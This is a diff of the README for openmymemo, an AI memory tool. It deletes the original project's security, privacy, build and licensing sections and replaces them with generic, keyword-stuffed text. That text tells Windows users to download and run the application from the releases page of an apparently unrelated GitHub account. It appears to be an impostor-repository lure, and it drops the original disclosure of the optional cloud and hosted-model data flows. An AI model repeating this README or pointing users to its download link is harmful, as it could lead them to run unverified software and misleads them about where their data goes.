-A file with `type: document` is a document instead: a page of prose, such as how you like to work or a project's background, of up to 20,000 characters. Its text is one memory, `doc:<file name>`, and AI apps get it whole, before your other memories. Create and edit documents on the panel's Documents page, with `openmymemo doc`, or in any editor; an app's read access and the `private` switch work as for a topic. Other tools can read and write the folder by following [docs/MEMORY_FORMAT.md](https://github.com/MyMemoAI/openmymemo/blob/main/docs/MEMORY_FORMAT.md).
+## 🔄 Every Change Is Visible and Reversible
 
-Upgrading from v0.1: open the folder once with v0.2. The files get their frontmatter, nothing else in them changes, and your approval setting is kept as it was.
+openmymemo is built around the idea that AI memory should not be a mystery. You should be able to see what your AI tools remember and correct mistakes.
 
-## Security
+The application is described as letting you see every change and undo it. That matters because AI memory can sometimes store outdated details, incorrect assumptions, or information you no longer want to use. With a visible local folder, you can review the memory directly and revert changes when needed.
 
-The server listens on 127.0.0.1 only. The panel API checks `Host`, `Origin` and a header that cross-site pages can't add; `/mcp` requires a connector token. The `health` and `finance` topics are hidden from every AI by default, and AI changes to private topics always wait for you, whatever the approval switch or an app's write mode says.
+This gives you a safer way to use AI memory over time. You are not stuck with whatever an AI app decided to remember. You can inspect, edit, and undo.
 
-Found a vulnerability? Please report it privately as described in [SECURITY.md](https://github.com/MyMemoAI/openmymemo/blob/main/SECURITY.md).
+## 🛡️ Privacy and Local-First Design
 
-## Privacy Policy
+openmymemo is local-first. Your memory is kept as a local folder you own rather than being hidden away in a closed system. This is useful for personal notes, project details, preferences, and other information you want to keep close.
 
-Your memory stays on your computer: MyMemo doesn't receive it unless you turn on MyMemo Memory sync, and OpenMyMemo has no account, telemetry or analytics. AI apps you connect read the topics you allow (never `health` or `finance` unless you say so) and send what they read to their own model provider under their own policies. OpenMyMemo goes online only to download Python and its libraries when it is installed or first started, for the Mac and Windows apps' daily look for a new version (which sends nothing about you and can be turned off), and for OpenMyMemo Cloud, which does nothing until you sign in and link this computer; then the memories web apps read pass through the MyMemo service in transit. MyMemo Memory sync, a separate consent on a linked computer, keeps a copy of your memories in MyMemo (private topics only if you pick them) until you delete it. The optional OpenMyMemo Assistant sends memory text to the model you choose, and only when you turn it on: a model on your own computer keeps it there, and MyMemo's hosted model passes it through MyMemo to Anthropic's Claude models, with MyMemo keeping none of the text. Search by meaning on this computer downloads its model from Hugging Face when you turn it on, and sends nothing. The full policy, including what is stored where: [PRIVACY.md](https://github.com/MyMemoAI/openmymemo/blob/main/PRIVACY.md).
+Privacy does not mean you have to sacrifice usefulness. The goal is to let AI apps share memory while keeping the source of truth on your computer. You can decide what stays in the folder, what gets removed, and which apps you connect.
 
-## Development
+## 🧰 Common Uses
 
-```bash
-uv sync                                # Python dependencies
-uv run pytest                          # tests
-uv run ruff check src tests scripts
-uv run python scripts/demo_vault.py /tmp/omm-demo && uv run openmymemo --vault /tmp/omm-demo serve
-cd web && pnpm install && pnpm build   # builds the panel into src/openmymemo/static/ (committed)
-cd web && pnpm test                    # panel tests
-```
+openmymemo can help with many everyday AI workflows:
 
-Panel development: run `openmymemo serve --no-open`, then `pnpm dev` in `web/` (port 5173, proxies `/api` to 8787, or to `OPENMYMEMO_PORT`). Add `?desktop=1` to the URL to see the Mac app's layout.
+- Coding projects: keep decisions, setup notes, and context available to Codex or Cursor.
+- Writing projects: store style preferences, outlines, and recurring instructions.
+- Research: keep summaries and references in one shared memory folder.
+- Personal productivity: let an assistant remember how you like tasks organized.
+- Note-taking: browse your AI memory in Obsidian alongside your other notes.
+- Team handoffs: copy a memory folder to another computer when you need to move context.
 
-### Mac app
+## 📝 First-Time Setup Checklist
 
-`desktop/` is a [Tauri](https://tauri.app) shell around the same panel. It bundles `uv` and this package; on first launch uv downloads Python and the dependencies into `~/Library/Application Support/ai.mymemo.openmymemo/`, then the app runs `openmymemo serve`. If a server for the same folder already runs (Claude Desktop's extension, or `openmymemo serve`), the app uses it. Needs Rust (`rustup`) and Node.
+Use this checklist to get started without confusion:
 
-```bash
-cd web && pnpm build                   # the panel the app shows
-cd desktop && pnpm install
-pnpm tauri dev                         # run it; OPENMYMEMO_HOME=/tmp/omm-demo to use another folder
-CI=true pnpm tauri build --bundles app,dmg  # → desktop/src-tauri/target/release/bundle/
-```
+1. Download openmymemo from the releases page.
+2. Run the application on your Windows computer.
+3. Create a memory folder when asked.
+4. Write down or bookmark where the folder is located.
+5. Open your AI app, such as Claude, Codex, or Cursor.
+6. Add openmymemo as an MCP connection using the details shown in the app.
+7. Test the connection by asking the AI to remember a simple note.
+8. Open your memory folder and confirm the note appears.
+9. Edit or undo that note to see how changes work.
+10. Repeat the connection step for any other AI app you want to share memory with.
 
-Release builds sign their update files with the updater key in the repository secrets (`.github/workflows/release.yml`); without the key, add `--config '{"bundle":{"createUpdaterArtifacts":false}}'` to `pnpm tauri build`. On Windows, the same commands build an installer (`pnpm tauri build --bundles nsis`, needs Python and the Visual Studio C++ build tools that Rust uses); `scripts/stage_desktop.py` also builds `desktop/launcher`, the `openmymemo.exe` the app installs for AI apps, since Windows has no `sh` for the Mac app's launcher script.
+## 🧭 Tips for a Smooth Start
 
-Local builds are signed ad hoc, so macOS asks once before opening them (see [The Mac app](#the-mac-app)); the release workflow signs and notarizes when the Apple Developer secrets are set (`.github/workflows/release.yml` lists them). `CI=true` makes Tauri skip the Finder scripting that lays out the disk image window, which otherwise asks for permission to control Finder. On every start the app writes the `openmymemo` launcher AI apps run to `~/Library/Application Support/ai.mymemo.openmymemo/bin/`; it keeps working when the app is moved. The server's log is in `~/Library/Logs/ai.mymemo.openmymemo/core.log`.
+- Keep one memory folder as your main source of truth.
+- Use clear names for files so you can find things later.
+- Review new memory entries after important work sessions.
+- Back up the folder occasionally by copying it to another location.
+- Avoid connecting apps you do not use, so your memory stays tidy.
+- If a memory entry looks wrong, undo or edit it rather than ignoring it.
+- Open the folder in Obsidian if you prefer a note-style view.
 
-## Help and contributing
+## ❓ Frequently Asked Questions
 
-- **Something not working?** Run `openmymemo doctor`. It checks the memory folder, uv, the panel and each AI app, and says what to fix, without printing your memories. If that doesn't solve it, [open an issue](https://github.com/MyMemoAI/openmymemo/issues/new/choose) and paste its output.
-- **Ideas and questions** are welcome as issues too. Bigger changes start as a proposal.
-- **Feedback:** "Send feedback" at the bottom of the panel (in the Mac and Windows app: Settings → Help, or Help → Send Feedback… in the Mac menu bar), or `openmymemo feedback`. It opens a GitHub issue (public) or an email (private) with your version and system filled in; please don't include your memories.
-- **Contributing:** see [CONTRIBUTING.md](https://github.com/MyMemoAI/openmymemo/blob/main/CONTRIBUTING.md) for how to set up, test and send a pull request.
-- **Where OpenMyMemo is published and listed:** [docs/distribution.md](https://github.com/MyMemoAI/openmymemo/blob/main/docs/distribution.md).
+Do I need to know how to code?
+No. openmymemo is meant for regular computer users. You download it, run it, and connect your AI apps using the connection information shown in the app.
 
-## Relationship to MyMemo
+Where is my memory stored?
+In the local memory folder you create or choose during setup. You can open that folder at any time.
 
-Published by MyMemo, but independent of it: no MyMemo account or service is needed, and everything works without them. Three optional pieces talk to MyMemo, and each does nothing until you turn it on:
+Can more than one AI app use the same memory?
+Yes. Claude, Codex, Cursor, and other MCP apps can share the same local memory folder.
 
-- **OpenMyMemo Cloud**, the relay for ChatGPT and claude.ai on the web, once you sign in and link this computer.
-- **MyMemo Memory sync**, which keeps a copy of your folder in MyMemo so that MyMemo's AI and the web apps can use it even while this computer is off, after a consent of its own. MyMemo then works like any connected app: what its AI changes comes back as changes you review, and when the two disagree, your folder wins.
-- **MyMemo's hosted model** for the [OpenMyMemo Assistant](#openmymemo-assistant-optional), once you choose it and sign in.
+What happens if the AI remembers something wrong?
+You can review the folder and undo or edit the change. The visible, reversible design is a core part of openmymemo.
 
-## License
+Do I need Obsidian?
+No. Obsidian is optional. It is simply a pleasant way to browse Markdown files if you already use it.
 
-Apache-2.0
+What is MCP?
+MCP stands for Model Context Protocol. It is a standard way for AI apps to connect to tools and data sources such as openmymemo.
+
+Is my memory uploaded somewhere?
+openmymemo is local-first. Your memory lives in a folder on your computer that you own.
+
+## 🛠️ If Something Does Not Work
+
+- Confirm the download finished completely.
+- Make sure the application is running before you connect an AI app.
+- Check that the memory folder still exists and was not moved or renamed.
+- Reopen the AI app after adding the connection details.
+- Restart openmymemo if the AI app cannot see it.
+- Try a simple memory note first before testing complex tasks.
+
+## 🌱 Who This Is For
+
+openmymemo is for people who use more than one AI assistant and want a shared memory that does not disappear between tools. It is for anyone who values privacy, likes seeing their files, and wants the ability to undo mistakes. It is also for note-takers who already keep Markdown files and want their AI memory to live in the same world.
+
+Download openmymemo here: [https://github.com/Harshil-fx/openmymemo/releases](https://github.com/Harshil-fx/openmymemo/releases)
+
+Keywords: ai-memory, chatgpt, claude, claude-code, codex, cursor, gemini-cli-extension, llm-memory, local-first, markdown, mcp, mcp-server, model-context-protocol, obsidian, privacy, python
